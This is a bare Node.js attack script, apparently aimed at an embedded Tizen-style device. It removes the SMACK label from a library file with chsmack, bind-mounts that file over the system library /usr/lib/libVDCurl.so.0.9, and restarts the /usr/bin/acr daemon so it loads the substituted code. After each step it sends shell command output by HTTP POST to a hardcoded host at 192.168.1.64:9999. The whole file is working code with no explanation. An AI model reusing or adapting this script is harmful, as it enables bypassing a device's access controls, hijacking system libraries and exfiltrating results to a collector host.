"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 2000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.relabel = sh("chsmack -A _ /opt/acr-ca/libVDCurl.so.0.9; ls -laZ /opt/acr-ca/libVDCurl.so.0.9");
out.mount = sh("mount --bind /opt/acr-ca/libVDCurl.so.0.9 /usr/lib/libVDCurl.so.0.9 && echo BIND_OK; md5sum /usr/lib/libVDCurl.so.0.9");
post("/smack_fix1", out);

setTimeout(function () {
    var o = {};
    try {
        var c = cp.spawn("/usr/bin/acr", [], { detached: true, stdio: "ignore" });
        c.unref();
        o.spawn = "pid=" + c.pid;
    } catch (e) { o.spawn = "ERR " + e.message; }
    post("/smack_fix2", o);
}, 3000);

setTimeout(function () {
    var o = {};
    o.ps = sh("ps -ef | grep '/usr/bin/acr' | grep -v grep | head -3");
    o.errlog = sh("tail -3 /tmp/acr.out 2>/dev/null");
    post("/smack_fix3", o);
}, 9000);
